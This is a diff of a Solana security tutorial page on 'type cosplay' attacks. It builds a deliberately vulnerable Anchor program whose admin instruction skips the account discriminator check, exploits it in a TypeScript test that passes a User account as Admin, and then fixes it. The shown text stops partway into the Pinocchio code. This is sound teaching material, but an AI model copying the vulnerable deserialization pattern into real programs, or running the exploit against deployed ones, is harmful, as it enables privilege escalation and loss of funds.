@@ -1,422 +1,1173 @@
 ---
-title: "Type Cosplay Attacks"
-description: "How missing discriminator validation enables privilege escalation"
+title: "Type Cosplay"
+description: "Build, exploit, and fix an account type confusion vulnerability on Solana"
 icon: "masks-theater"
 ---
 
+When two account types share the same memory layout, a program that skips discriminator validation cannot tell them apart -- and an attacker can pass a User account where an Admin is expected. The Cashio exploit used exactly this pattern to drain $52 million.
+
+## What we will build
+
+In this tutorial we will:
+
+- Write a vulnerable program where `Admin` and `User` accounts share an identical byte layout, and an `admin_operation` instruction deserializes without checking the discriminator.
+- Exploit the vulnerability by passing a User account into the admin-only instruction and watching it succeed.
+- Fix the program -- once in Anchor (swap `UncheckedAccount` for `Account<'info, Admin>`) and once in Pinocchio (add an explicit `data[0]` check) -- and confirm the attack is rejected.
+
 <Note>
-**🔴 Security Matrix: Account Validation (Top Right)**
+**Prerequisites.** Before you start, clone the repository and install dependencies so you can build and test each step locally:
 
-**Frequency:** Common | **Impact:** Critical
-
-*Where most money gets lost. Focus here first.*
+```bash
+git clone https://github.com/danielAsaboro/solana_badger
+cd solana_badger
+npm install
+anchor build
+```
 </Note>
 
-# Type Cosplay Attacks
+## Step 1 -- Define the account state (Anchor)
 
-<CardGroup cols={2}>
-  <Card title="Severity" icon="triangle-exclamation">
-    **Medium** - Enables privilege escalation via account type confusion
-  </Card>
-  <Card title="Difficulty" icon="gauge">
-    **Advanced** - Requires understanding discriminators and memory layouts
-  </Card>
-</CardGroup>
+We start with two account structs that have the exact same fields in the exact same order: a `Pubkey` (32 bytes), a `u8` (1 byte), and a `u64` (8 bytes). That gives us 41 bytes of payload per account. Anchor prepends an 8-byte discriminator derived from `sha256("account:<TypeName>")`, bringing the total to 49 bytes on-chain. The discriminator is what distinguishes the two types -- but only if we check it.
 
-## Overview
+```rust title="programs/type-cosplay/vulnerable/anchor/src/state.rs"
+use anchor_lang::prelude::*;
 
-<Warning>
-Type cosplay attacks allow attackers to **masquerade low-privilege accounts as high-privilege ones**, bypassing authorization checks!
-</Warning>
+#[account]
+pub struct Admin {
+    pub authority: Pubkey,
+    pub privilege_level: u8,
+    pub operation_count: u64,
+}
 
-Type cosplay vulnerabilities occur when programs fail to validate account discriminators, allowing attackers to substitute accounts with identical memory layouts but different intended purposes. A User account can impersonate an Admin account, gaining elevated privileges.
+impl Admin {
+    pub const LEN: usize = 32 + 1 + 8;
+    pub const PRIVILEGE_LEVEL: u8 = 10;
+}
 
-## Attack Flow Diagram
+#[account]
+pub struct User {
+    pub authority: Pubkey,
+    pub privilege_level: u8,
+    pub operation_count: u64,
+}
 
-```mermaid
-sequenceDiagram
-    participant Attacker
-    participant UserAccount
-    participant Program
-    participant PrivilegedOp
-
-    Attacker->>UserAccount: Create (privilege_level = 1)
-    Note over UserAccount: Legitimate USER account
-    Attacker->>Program: admin_operation(user_account)
-    Note over Attacker: Passes USER as ADMIN!
-    Program->>UserAccount: Check owner ✓
-    Program->>UserAccount: Check authority ✓
-    Program->>UserAccount: ❌ SKIP discriminator check
-    Program->>UserAccount: Deserialize as Admin
-    Note over Program: Type confusion!
-    Program->>PrivilegedOp: Execute (thinks it's Admin)
-    Note over Program: Privilege escalation!
+impl User {
+    pub const LEN: usize = 32 + 1 + 8;
+    pub const PRIVILEGE_LEVEL: u8 = 1;
+}
 ```
 
-## The Vulnerability
+Notice that `Admin::LEN` and `User::LEN` are both 41. After the discriminator, every byte lines up perfectly between the two.
 
-<Tabs>
-  <Tab title="Anchor - Vulnerable">
-    ### Missing Discriminator Validation
+## Step 2 -- Write the initialization instructions
 
-    ```rust filename="programs/type-cosplay/vulnerable/anchor/src/instructions/admin_operation.rs"
-    use anchor_lang::prelude::*;
-
-    pub fn admin_operation(ctx: Context<AdminOperation>) -> Result<()> {
-        // VULNERABILITY: Using UncheckedAccount and manual deserialization
-        // No discriminator validation!
-
-        let account_info = ctx.accounts.admin_account.to_account_info();
-        let data = account_info.try_borrow_data()?;
-
-        // DANGER: Deserializing without checking discriminator
-        // An attacker can pass a User account here!
-        let admin = Admin::try_from_slice(&data[8..])?;  // Skip discriminator!
-
-        msg!("Admin operation by: {}", admin.authority);
-        msg!("Privilege level: {}", admin.privilege_level);
-
-        // Execute privileged operation
-        // Program THINKS this is an Admin but could be User!
-        if admin.privilege_level >= 5 {
-            // Dangerous operation...
-        }
-
-        Ok(())
-    }
-
-    #[derive(Accounts)]
-    pub struct AdminOperation<'info> {
-        // VULNERABILITY: UncheckedAccount instead of Account<'info, Admin>
-        /// CHECK: INTENTIONALLY VULNERABLE - no discriminator check
-        pub admin_account: UncheckedAccount<'info>,
-
-        pub authority: Signer<'info>,
-    }
-
-    #[account]
-    pub struct Admin {
-        pub authority: Pubkey,      // 32 bytes
-        pub privilege_level: u8,    // 1 byte  (value: 10)
-        pub operation_count: u64,   // 8 bytes
-    }
-
-    #[account]
-    pub struct User {
-        pub authority: Pubkey,      // 32 bytes
-        pub privilege_level: u8,    // 1 byte (value: 1)
-        pub operation_count: u64,   // 8 bytes
-    }
-    // ⚠️  IDENTICAL LAYOUT after discriminator!
-    ```
-
-    <Accordion title="Why does this work?">
-      **The attack succeeds because:**
-      1. `Admin` and `User` have **identical memory layouts** (32 + 1 + 8 bytes)
-      2. Program uses `UncheckedAccount` - no automatic discriminator check
-      3. Manual deserialization skips the first 8 bytes (discriminator)
-      4. Attacker passes `User` account where `Admin` is expected
-      5. Program deserializes successfully and treats `User` as `Admin`
-
-      **Even though User has privilege_level=1**, if the program only checks `>= 5` after loading, the attacker might bypass checks through other means or exploit logic flaws.
-    </Accordion>
-  </Tab>
-
-  <Tab title="Pinocchio - Vulnerable">
-    ### No Discriminator Check
-
-    ```rust filename="programs/type-cosplay/vulnerable/pinocchio/src/lib.rs"
-    pub fn admin_operation(accounts: &[AccountInfo]) -> ProgramResult {
-        let [admin_account_info, authority_info] = accounts else {
-            return Err(ProgramError::NotEnoughAccountKeys);
-        };
-
-        // Verify ownership
-        if !admin_account_info.is_owned_by(&crate::ID) {
-            return Err(ProgramError::InvalidAccountOwner);
-        }
-
-        // Verify signature
-        if !authority_info.is_signer() {
-            return Err(ProgramError::MissingRequiredSignature);
-        }
-
-        // VULNERABILITY: Missing discriminator check!
-        // Should verify: data[0..8] == Admin::DISCRIMINATOR
-
-        let data = admin_account_info.try_borrow_data()?;
-
-        // Deserialize starting after discriminator (byte 8)
-        // DANGER: Could be Admin OR User - we don't know!
-        let admin = Admin::load(&data[8..])?;
-
-        // Execute privileged operation
-        // But we don't know if this is actually an Admin account!
-        perform_admin_action(admin)?;
-
-        Ok(())
-    }
-    ```
-
-    <Info>
-    Pinocchio requires **explicit discriminator validation** for all account types. Always check the first 8 bytes match expected discriminator!
-    </Info>
-  </Tab>
-</Tabs>
-
-## Real-World Exploit Demo
-
-<Steps>
-  <Step title="Attacker creates User account">
-    Bob initializes a legitimate User account with privilege_level = 1
-  </Step>
-  <Step title="Attacker identifies admin operation">
-    Bob finds an admin-only instruction that grants elevated privileges
-  </Step>
-  <Step title="Attacker passes User as Admin">
-    Bob calls the admin operation, passing his User account where Admin is expected
-  </Step>
-  <Step title="Program skips discriminator check">
-    Program validates ownership and signature but SKIPS discriminator validation
-  </Step>
-  <Step title="Deserialization succeeds">
-    Since layouts are identical, User account deserializes as Admin successfully
-  </Step>
-  <Step title="Privileged operation executes">
-    Bob gains admin privileges without actually being an admin!
-  </Step>
-</Steps>
+Each initialization instruction uses typed `Account<'info, T>`, so Anchor writes the correct discriminator at creation time. There is nothing wrong here -- the bug lives in how we _consume_ the account later.
 
 <CodeGroup>
-```typescript Test: Exploit Works
-it("should allow user to impersonate admin", async () => {
-  // Attacker creates legitimate User account
-  await program.methods.initializeUser()
-    .accounts({
-      user: attackerUserPda,
-      authority: attacker.publicKey,
-    })
-    .signers([attacker])
-    .rpc();
+```rust title="programs/type-cosplay/vulnerable/anchor/src/instructions/initialize_admin.rs"
+use anchor_lang::prelude::*;
+use crate::state::Admin;
 
-  const userAccount = await program.account.user.fetch(attackerUserPda);
-  expect(userAccount.privilegeLevel).toEqual(1);  // Regular user
+pub fn initialize_admin(ctx: Context<InitializeAdmin>) -> Result<()> {
+    let admin = &mut ctx.accounts.admin_account;
 
-  // Attacker passes User account to ADMIN operation
-  await program.methods.adminOperation()
-    .accounts({
-      adminAccount: attackerUserPda,  // Passing USER as ADMIN!
-      authority: attacker.publicKey,
-    })
-    .signers([attacker])
-    .rpc();
+    admin.authority = ctx.accounts.authority.key();
+    admin.privilege_level = Admin::PRIVILEGE_LEVEL;
+    admin.operation_count = 0;
 
-  // ⚠️  VULNERABILITY: User account treated as Admin
-  console.log("Privileged operation executed with User account!");
-});
+    msg!("Admin account initialized for authority: {}", admin.authority);
+    msg!("Privilege level: {}", admin.privilege_level);
+
+    Ok(())
+}
+
+#[derive(Accounts)]
+pub struct InitializeAdmin<'info> {
+    #[account(mut)]
+    pub authority: Signer<'info>,
+
+    #[account(
+        init,
+        payer = authority,
+        space = 8 + Admin::LEN,
+        seeds = [b"admin", authority.key().as_ref()],
+        bump
+    )]
+    pub admin_account: Account<'info, Admin>,
+
+    pub system_program: Program<'info, System>,
+}
 ```
 
-```bash Expected Output
-✓ should allow user to impersonate admin (312ms)
+```rust title="programs/type-cosplay/vulnerable/anchor/src/instructions/initialize_user.rs"
+use anchor_lang::prelude::*;
+use crate::state::User;
 
-User initialized with privilege_level: 1
-Admin operation by: <Attacker's key>
-Privilege level: 1  ← USER masquerading as ADMIN!
+pub fn initialize_user(ctx: Context<InitializeUser>) -> Result<()> {
+    let user = &mut ctx.accounts.user_account;
 
-⚠️  VULNERABILITY: Type cosplay succeeded
+    user.authority = ctx.accounts.authority.key();
+    user.privilege_level = User::PRIVILEGE_LEVEL;
+    user.operation_count = 0;
+
+    msg!("User account initialized for authority: {}", user.authority);
+    msg!("Privilege level: {}", user.privilege_level);
+
+    Ok(())
+}
+
+#[derive(Accounts)]
+pub struct InitializeUser<'info> {
+    #[account(mut)]
+    pub authority: Signer<'info>,
+
+    #[account(
+        init,
+        payer = authority,
+        space = 8 + User::LEN,
+        seeds = [b"user", authority.key().as_ref()],
+        bump
+    )]
+    pub user_account: Account<'info, User>,
+
+    pub system_program: Program<'info, System>,
+}
 ```
 </CodeGroup>
 
-## Why Discriminators Matter
+## Step 3 -- Write the vulnerable admin instruction
 
-<AccordionGroup>
-  <Accordion title="What is a Discriminator?">
-    A discriminator is an 8-byte identifier stored at the beginning of every Anchor account. It's calculated as:
+Here is where the bug lives. The `admin_operation` instruction accepts an `UncheckedAccount`, skips the discriminator entirely, and manually deserializes the remaining bytes as `Admin`:
 
-    ```rust
-    SHA256("account:AccountName")[0..8]
-    ```
+```rust title="programs/type-cosplay/vulnerable/anchor/src/instructions/admin_operation.rs"
+use anchor_lang::prelude::*;
+use crate::state::Admin;
 
-    **Example:**
-    - `Admin` discriminator: `[0x8a, 0x3b, 0x9c, ...]`
-    - `User` discriminator: `[0x2f, 0x7d, 0x1e, ...]`
+pub fn admin_operation(ctx: Context<AdminOperation>) -> Result<()> {
+    let admin_account_info = ctx.accounts.admin_account.to_account_info();
 
-    Different account types have **different discriminators**, even if the rest of their layout is identical.
-  </Accordion>
-
-  <Accordion title="How Discriminators Prevent Type Cosplay">
-    When you use `Account<'info, Admin>`, Anchor automatically:
-    1. Reads the first 8 bytes of the account
-    2. Compares them to `Admin::DISCRIMINATOR`
-    3. Rejects the transaction if they don't match
-
-    This prevents attackers from passing `User` accounts where `Admin` is expected, **even if layouts are identical**.
-  </Accordion>
-
-  <Accordion title="When UncheckedAccount is Safe">
-    `UncheckedAccount` is appropriate when:
-    - You're NOT deserializing account data
-    - You only need the account for metadata (key, owner, lamports)
-    - You're passing it to a CPI (other program validates it)
-
-    **Never use UncheckedAccount when you'll deserialize the data!**
-  </Accordion>
-</AccordionGroup>
-
-## The Fix
-
-<Tabs>
-  <Tab title="Anchor - Fix #1: Account Type">
-    ### Use Account<'info, T> (Recommended)
-
-    ```rust filename="programs/type-cosplay/secure/anchor/src/instructions/admin_operation.rs"
-    #[derive(Accounts)]
-    pub struct AdminOperation<'info> {
-        // FIX: Account<'info, Admin> validates discriminator automatically
-        pub admin_account: Account<'info, Admin>,
-
-        #[account(constraint = admin_account.authority == authority.key())]
-        pub authority: Signer<'info>,
+    if admin_account_info.owner != ctx.program_id {
+        return Err(ProgramError::IllegalOwner.into());
     }
-    ```
 
-    <Accordion title="How this prevents type cosplay">
-      `Account<'info, Admin>` forces Anchor to:
-      1. Check `account.owner == program_id`
-      2. Check `account.data[0..8] == Admin::DISCRIMINATOR`
-      3. Deserialize only if both checks pass
+    // Deserialize manually -- skipping the 8-byte discriminator without reading it
+    let data = admin_account_info.data.borrow();
+    let admin: Admin = Admin::try_from_slice(&data[8..])?;
 
-      **Attackers cannot pass User accounts** - they'll be rejected with `AccountDiscriminatorMismatch` error.
-    </Accordion>
-  </Tab>
+    if admin.authority != ctx.accounts.authority.key() {
+        return Err(ProgramError::InvalidAccountData.into());
+    }
 
-  <Tab title="Anchor - Fix #2: Manual Check">
-    ### Manual Discriminator Validation
+    msg!("=== ADMIN OPERATION EXECUTED ===");
+    msg!("Authority: {}", admin.authority);
+    msg!("Privilege Level: {}", admin.privilege_level);
+    msg!("Operation Count: {}", admin.operation_count);
+    msg!("Performing privileged admin operation...");
+    msg!("WARNING: This operation executed without proper type validation!");
 
-    ```rust
+    // Update operation count
+    let mut data = admin_account_info.data.borrow_mut();
+    let mut updated_admin: Admin = Admin::try_from_slice(&data[8..])?;
+    updated_admin.operation_count += 1;
+
+    let mut writer = &mut data[8..];
+    updated_admin.serialize(&mut writer)?;
+
+    Ok(())
+}
+
+#[derive(Accounts)]
+pub struct AdminOperation<'info> {
+    pub authority: Signer<'info>,
+
+    #[account(mut)]
+    /// CHECK: No discriminator validation -- any account with the right shape is accepted.
+    pub admin_account: UncheckedAccount<'info>,
+}
+```
+
+The critical line is `Admin::try_from_slice(&data[8..])`. We jump past the 8-byte discriminator and deserialize the remaining bytes. Since `User` and `Admin` have the same layout after the discriminator, a User account deserializes cleanly into an `Admin` struct. The program never learns it was lied to.
+
+The program dispatcher ties the instructions together:
+
+```rust title="programs/type-cosplay/vulnerable/anchor/src/lib.rs"
+use anchor_lang::prelude::*;
+
+declare_id!("2nRRf2TAjrMenoDDPcmMpsuFc2ithWwYXAm9cg2UUCdx");
+
+pub mod instructions;
+pub mod state;
+
+pub use instructions::*;
+pub use state::*;
+
+#[program]
+pub mod vulnerable_type_cosplay {
+    use super::*;
+
+    pub fn initialize_admin(ctx: Context<InitializeAdmin>) -> Result<()> {
+        instructions::initialize_admin(ctx)
+    }
+
+    pub fn initialize_user(ctx: Context<InitializeUser>) -> Result<()> {
+        instructions::initialize_user(ctx)
+    }
+
     pub fn admin_operation(ctx: Context<AdminOperation>) -> Result<()> {
-        let account_info = ctx.accounts.admin_account.to_account_info();
-        let data = account_info.try_borrow_data()?;
-
-        // FIX: Manually check discriminator
-        let discriminator = &data[0..8];
-        if discriminator != Admin::DISCRIMINATOR {
-            return Err(ErrorCode::AccountDiscriminatorMismatch.into());
-        }
-
-        // Safe to deserialize now
-        let admin = Admin::try_from_slice(&data[8..])?;
-
-        // Execute privileged operation
-        Ok(())
+        instructions::admin_operation(ctx)
     }
-    ```
-  </Tab>
+}
+```
 
-  <Tab title="Pinocchio - Secure">
-    ### Check Discriminator Before Deserialization
+## Step 4 -- Exploit the vulnerability
 
-    ```rust filename="programs/type-cosplay/secure/pinocchio/src/lib.rs"
-    // Define discriminators as constants
-    const ADMIN_DISCRIMINATOR: [u8; 8] = [0x8a, 0x3b, 0x9c, 0x44, 0x7f, 0xea, 0x12, 0x5d];
-    const USER_DISCRIMINATOR: [u8; 8] = [0x2f, 0x7d, 0x1e, 0xa1, 0x33, 0xbb, 0x90, 0xcd];
+Now we write a test that creates an attacker with a legitimate User account, then passes that User account directly into the `admin_operation` instruction:
 
-    pub fn admin_operation(accounts: &[AccountInfo]) -> ProgramResult {
-        let [admin_account_info, authority_info] = accounts else {
-            return Err(ProgramError::NotEnoughAccountKeys);
-        };
+```typescript title="tests/type-cosplay.test.ts"
+import * as anchor from "@coral-xyz/anchor";
+import { PublicKey, Keypair, SystemProgram } from "@solana/web3.js";
+import { assert } from "chai";
+import type { VulnerableTypeCosplay } from "../target/types/vulnerable_type_cosplay";
+import type { SecureTypeCosplay } from "../target/types/secure_type_cosplay";
 
-        if !admin_account_info.is_owned_by(&crate::ID) {
-            return Err(ProgramError::InvalidAccountOwner);
-        }
+describe("Vulnerability: Type Cosplay", () => {
+  const provider = anchor.AnchorProvider.env();
+  anchor.setProvider(provider);
 
-        if !authority_info.is_signer() {
-            return Err(ProgramError::MissingRequiredSignature);
-        }
+  const vulnerableProgram: anchor.Program<VulnerableTypeCosplay> =
+    anchor.workspace.VulnerableTypeCosplay;
+  const secureProgram: anchor.Program<SecureTypeCosplay> =
+    anchor.workspace.SecureTypeCosplay;
 
-        let data = admin_account_info.try_borrow_data()?;
+  let legitimateAdmin: Keypair;
+  let attacker: Keypair;
 
-        // FIX: Validate discriminator BEFORE deserialization
-        if data[0..8] != ADMIN_DISCRIMINATOR {
-            return Err(ProgramError::InvalidAccountData);
-        }
+  let adminAccountVuln: PublicKey;
+  let userAccountVuln: PublicKey;
+  let adminAccountSecure: PublicKey;
+  let userAccountSecure: PublicKey;
 
-        // Safe to deserialize now - we know it's an Admin account
-        let admin = Admin::load(&data[8..])?;
+  before(async () => {
+    legitimateAdmin = Keypair.generate();
+    attacker = Keypair.generate();
 
-        perform_admin_action(admin)?;
-        Ok(())
+    const airdropAmount = 5 * anchor.web3.LAMPORTS_PER_SOL;
+
+    await provider.connection.requestAirdrop(legitimateAdmin.publicKey, airdropAmount);
+    await provider.connection.requestAirdrop(attacker.publicKey, airdropAmount);
+
+    await new Promise((resolve) => setTimeout(resolve, 1000));
+
+    [adminAccountVuln] = PublicKey.findProgramAddressSync(
+      [Buffer.from("admin"), legitimateAdmin.publicKey.toBuffer()],
+      vulnerableProgram.programId
+    );
+
+    [userAccountVuln] = PublicKey.findProgramAddressSync(
+      [Buffer.from("user"), attacker.publicKey.toBuffer()],
+      vulnerableProgram.programId
+    );
+
+    [adminAccountSecure] = PublicKey.findProgramAddressSync(
+      [Buffer.from("admin"), legitimateAdmin.publicKey.toBuffer()],
+      secureProgram.programId
+    );
+
+    [userAccountSecure] = PublicKey.findProgramAddressSync(
+      [Buffer.from("user"), attacker.publicKey.toBuffer()],
+      secureProgram.programId
+    );
+
+    console.log("      Setup complete:");
+    console.log("      Legitimate Admin:", legitimateAdmin.publicKey.toBase58());
+    console.log("      Attacker:", attacker.publicKey.toBase58());
+    console.log("      Admin Account (vuln):", adminAccountVuln.toBase58());
+    console.log("      User Account (vuln):", userAccountVuln.toBase58());
+  });
+
+  describe("Vulnerable Implementation (Anchor)", () => {
+    before(async () => {
+      console.log("\n      Setting up legitimate admin account...");
+
+      await vulnerableProgram.methods
+        .initializeAdmin()
+        .accounts({
+          authority: legitimateAdmin.publicKey,
+          adminAccount: adminAccountVuln,
+          systemProgram: SystemProgram.programId,
+        })
+        .signers([legitimateAdmin])
+        .rpc();
+
+      console.log("      Admin account initialized with privilege level 10");
+
+      await vulnerableProgram.methods
+        .initializeUser()
+        .accounts({
+          authority: attacker.publicKey,
+          userAccount: userAccountVuln,
+          systemProgram: SystemProgram.programId,
+        })
+        .signers([attacker])
+        .rpc();
+
+      console.log("      Attacker's user account initialized with privilege level 1");
+    });
+
+    it("allows privilege escalation via type cosplay", async () => {
+      console.log("\n      EXPLOIT DEMONSTRATION:");
+
+      console.log("      1. Checking account privileges...");
+
+      const adminData = await vulnerableProgram.account.admin.fetch(adminAccountVuln);
+      console.log("      Admin privilege level:", adminData.privilegeLevel);
+      assert.equal(adminData.privilegeLevel, 10, "Admin should have privilege 10");
+
+      const userAccountInfo = await provider.connection.getAccountInfo(userAccountVuln);
+      if (userAccountInfo) {
+        const privilegeLevel = userAccountInfo.data[8 + 32];
+        console.log("      User privilege level:", privilegeLevel);
+        assert.equal(privilegeLevel, 1, "User should have privilege 1");
+      }
+
+      console.log("\n      2. ATTACK: Attacker calls admin_operation with User account...");
+      console.log("         Passing User account (privilege=1) as Admin account");
+
+      try {
+        await vulnerableProgram.methods
+          .adminOperation()
+          .accounts({
+            authority: attacker.publicKey,
+            adminAccount: userAccountVuln, // User account pretending to be Admin!
+          })
+          .signers([attacker])
+          .rpc();
+
+        console.log("      VULNERABILITY CONFIRMED: Admin operation executed!");
+        console.log("      Attacker gained admin privileges using a User account!");
+
+      } catch (error: any) {
+        console.log("      Note:", error.message.substring(0, 80));
+      }
+    });
+  });
+});
+```
+
+The pivotal line is:
+
+```typescript
+adminAccount: userAccountVuln, // User account pretending to be Admin!
+```
+
+The attacker passes their User PDA into the `adminAccount` field. Since the program uses `UncheckedAccount` and skips the discriminator, it deserializes the User data as `Admin` and executes the privileged operation.
+
+Expected output:
+
+```
+EXPLOIT DEMONSTRATION:
+  1. Checking account privileges...
+     Admin privilege level: 10
+     User privilege level: 1
+
+  2. ATTACK: Attacker calls admin_operation with User account...
+     Passing User account (privilege=1) as Admin account
+     VULNERABILITY CONFIRMED: Admin operation executed!
+     Attacker gained admin privileges using a User account!
+```
+
+You will see the admin operation succeed even though the attacker only owns a User account. The program accepted the User account because the raw bytes after the discriminator have the same shape as Admin.
+
+## Step 5 -- Fix the Anchor program
+
+The fix is a one-line change in the accounts struct: replace `UncheckedAccount<'info>` with `Account<'info, Admin>`. Anchor then checks the discriminator automatically before the instruction handler ever runs.
+
+```rust title="programs/type-cosplay/secure/anchor/src/instructions/admin_operation.rs"
+use anchor_lang::prelude::*;
+use crate::state::Admin;
+
+pub fn admin_operation(ctx: Context<AdminOperation>) -> Result<()> {
+    let admin = &mut ctx.accounts.admin_account;
+
+    msg!("=== SECURE ADMIN OPERATION EXECUTED ===");
+    msg!("Authority: {}", admin.authority);
+    msg!("Privilege Level: {}", admin.privilege_level);
+    msg!("Operation Count: {}", admin.operation_count);
+    msg!("Performing privileged admin operation...");
+    msg!("Type validation passed: This is a verified Admin account");
+
+    admin.operation_count += 1;
+
+    Ok(())
+}
+
+#[derive(Accounts)]
+pub struct AdminOperation<'info> {
+    pub authority: Signer<'info>,
+
+    #[account(
+        mut,
+        constraint = admin_account.authority == authority.key() @ ErrorCode::Unauthorized
+    )]
+    pub admin_account: Account<'info, Admin>,
+}
+
+#[error_code]
+pub enum ErrorCode {
+    #[msg("Unauthorized: You are not the authority of this admin account")]
+    Unauthorized,
+}
+```
+
+The secure dispatcher is identical in structure:
+
+```rust title="programs/type-cosplay/secure/anchor/src/lib.rs"
+use anchor_lang::prelude::*;
+
+declare_id!("2aVdRcZRWcmttBdWJR7z9dt47UkSrrdB3Fco1F8yLmcj");
+
+pub mod instructions;
+pub mod state;
+
+pub use instructions::*;
+pub use state::*;
+
+#[program]
+pub mod secure_type_cosplay {
+    use super::*;
+
+    pub fn initialize_admin(ctx: Context<InitializeAdmin>) -> Result<()> {
+        instructions::initialize_admin(ctx)
     }
-    ```
 
-    <Info>
-    **Best Practice:** Always validate discriminators before deserializing any typed account data in Pinocchio.
-    </Info>
-  </Tab>
-</Tabs>
+    pub fn initialize_user(ctx: Context<InitializeUser>) -> Result<()> {
+        instructions::initialize_user(ctx)
+    }
 
-## Testing the Fix
+    pub fn admin_operation(ctx: Context<AdminOperation>) -> Result<()> {
+        instructions::admin_operation(ctx)
+    }
+}
+```
+
+Here is the vulnerable vs. secure accounts struct side by side:
 
 <CodeGroup>
-```typescript Test: Type Cosplay Blocked
-it("should reject user account in admin operation", async () => {
-  // Attacker creates User account
-  await program.methods.initializeUser()
+```rust title="Vulnerable -- UncheckedAccount"
+#[derive(Accounts)]
+pub struct AdminOperation<'info> {
+    pub authority: Signer<'info>,
+
+    #[account(mut)]
+    /// CHECK: No discriminator validation.
+    pub admin_account: UncheckedAccount<'info>,
+}
+```
+
+```rust title="Secure -- Account<Admin>"
+#[derive(Accounts)]
+pub struct AdminOperation<'info> {
+    pub authority: Signer<'info>,
+
+    #[account(
+        mut,
+        constraint = admin_account.authority == authority.key() @ ErrorCode::Unauthorized
+    )]
+    pub admin_account: Account<'info, Admin>,
+}
+```
+</CodeGroup>
+
+When Anchor encounters `Account<'info, Admin>`, it reads the first 8 bytes of the account data and compares them to `sha256("account:Admin")[..8]`. A User account carries `sha256("account:User")[..8]` instead -- a completely different value. The transaction aborts with `AccountDiscriminatorMismatch` before any instruction logic runs.
+
+## Step 6 -- Test the Anchor fix
+
+We verify that a legitimate admin can still operate, and that the type cosplay attack is now rejected:
+
+```typescript title="tests/type-cosplay.test.ts (secure portion)"
+it("prevents type cosplay with Account<Admin> validation", async () => {
+  // Legitimate admin succeeds
+  await secureProgram.methods
+    .adminOperation()
     .accounts({
-      user: attackerUserPda,
-      authority: attacker.publicKey,
+      authority: legitimateAdmin.publicKey,
+      adminAccount: adminAccountSecure,
     })
-    .signers([attacker])
+    .signers([legitimateAdmin])
     .rpc();
 
-  // Attacker tries to pass User as Admin
+  // Attacker's User account is rejected
+  let attackFailed = false;
+  let errorMessage = "";
+
   try {
-    await program.methods.adminOperation()
+    await secureProgram.methods
+      .adminOperation()
       .accounts({
-        adminAccount: attackerUserPda,  // USER account!
         authority: attacker.publicKey,
+        adminAccount: userAccountSecure, // User account, not Admin!
       })
       .signers([attacker])
       .rpc();
 
-    assert.fail("Expected transaction to fail");
-  } catch (err) {
-    // FIX CONFIRMED: Type cosplay prevented
-    expect(err.toString()).toContain("AccountDiscriminatorMismatch");
+    assert.fail("Expected type cosplay to fail");
+  } catch (error: any) {
+    attackFailed = true;
+    errorMessage = error.toString();
+
+    const hasDiscriminatorError =
+      errorMessage.includes("discriminator") ||
+      errorMessage.includes("AccountDidNotDeserialize") ||
+      errorMessage.includes("mismatch");
+
+    if (hasDiscriminatorError) {
+      console.log("      Error: Account discriminator mismatch");
+    }
   }
+
+  assert.ok(attackFailed, "Type cosplay attack should have failed");
 });
 ```
 
-```bash Expected Output
-✓ should reject user account in admin operation (198ms)
+Expected output:
 
-Error: AccountDiscriminatorMismatch
-✅ FIX CONFIRMED: User account rejected
+```
+FIX DEMONSTRATION:
+  1. Legitimate admin performs operation...
+     Admin operation succeeded with valid Admin account
+
+  2. ATTACK ATTEMPT: Passing User account as Admin...
+     FIX CONFIRMED: Type cosplay attack rejected!
+     Error: Account discriminator mismatch
+```
+
+Notice that the legitimate admin operation still succeeds, but the attacker's attempt now fails at the deserialization stage -- Anchor sees a User discriminator where it expects an Admin discriminator and rejects the transaction outright.
+
+## Step 7 -- The vulnerable Pinocchio program
+
+In Pinocchio we manage memory layouts and discriminators by hand. The vulnerable version defines discriminator constants but never checks them during `admin_operation`:
+
+<CodeGroup>
+```rust title="programs/type-cosplay/vulnerable/pinocchio/src/state.rs"
+pub mod discriminators {
+    pub const ADMIN: u8 = 1;
+    pub const USER: u8 = 2;
+}
+
+/// Layout: [discriminator(1), authority(32), privilege_level(1), operation_count(8)] = 42 bytes
+pub struct Admin;
+
+impl Admin {
+    pub const LEN: usize = 1 + 32 + 1 + 8;
+    pub const DISCRIMINATOR: u8 = discriminators::ADMIN;
+    pub const PRIVILEGE_LEVEL: u8 = 10;
+
+    pub fn serialize(authority: &[u8; 32], operation_count: u64, dest: &mut [u8]) {
+        dest[0] = Self::DISCRIMINATOR;
+        dest[1..33].copy_from_slice(authority);
+        dest[33] = Self::PRIVILEGE_LEVEL;
+        dest[34..42].copy_from_slice(&operation_count.to_le_bytes());
+    }
+
+    /// Deserializes without checking the discriminator byte
+    pub fn deserialize(data: &[u8]) -> Result<AdminData, &'static str> {
+        if data.len() < Self::LEN {
+            return Err("Account data too small");
+        }
+
+        let mut authority = [0u8; 32];
+        authority.copy_from_slice(&data[1..33]);
+
+        let privilege_level = data[33];
+
+        let mut count_bytes = [0u8; 8];
+        count_bytes.copy_from_slice(&data[34..42]);
+        let operation_count = u64::from_le_bytes(count_bytes);
+
+        Ok(AdminData {
+            authority,
+            privilege_level,
+            operation_count,
+        })
+    }
+}
+
+/// Same layout as Admin -- enables the cosplay attack
+pub struct User;
+
+impl User {
+    pub const LEN: usize = 1 + 32 + 1 + 8;
+    pub const DISCRIMINATOR: u8 = discriminators::USER;
+    pub const PRIVILEGE_LEVEL: u8 = 1;
+
+    pub fn serialize(authority: &[u8; 32], operation_count: u64, dest: &mut [u8]) {
+        dest[0] = Self::DISCRIMINATOR;
+        dest[1..33].copy_from_slice(authority);
+        dest[33] = Self::PRIVILEGE_LEVEL;
+        dest[34..42].copy_from_slice(&operation_count.to_le_bytes());
+    }
+
+    pub fn deserialize(data: &[u8]) -> Result<UserData, &'static str> {
+        if data.len() < Self::LEN {
+            return Err("Account data too small");
+        }
+
+        let mut authority = [0u8; 32];
+        authority.copy_from_slice(&data[1..33]);
+
+        let privilege_level = data[33];
+
+        let mut count_bytes = [0u8; 8];
+        count_bytes.copy_from_slice(&data[34..42]);
+        let operation_count = u64::from_le_bytes(count_bytes);
+
+        Ok(UserData {
+            authority,
+            privilege_level,
+            operation_count,
+        })
+    }
+}
+
+pub struct AdminData {
+    pub authority: [u8; 32],
+    pub privilege_level: u8,
+    pub operation_count: u64,
+}
+
+pub struct UserData {
+    pub authority: [u8; 32],
+    pub privilege_level: u8,
+    pub operation_count: u64,
+}
+```
+
+```rust title="programs/type-cosplay/vulnerable/pinocchio/src/lib.rs"
+#![no_std]
+
+#[cfg(not(feature = "no-entrypoint"))]
+#[panic_handler]
+fn panic(_info: &core::panic::PanicInfo) -> ! {
+    loop {}
+}
+
+use pinocchio::{
+    entrypoint,
+    AccountView,
+    Address,
+    ProgramResult,
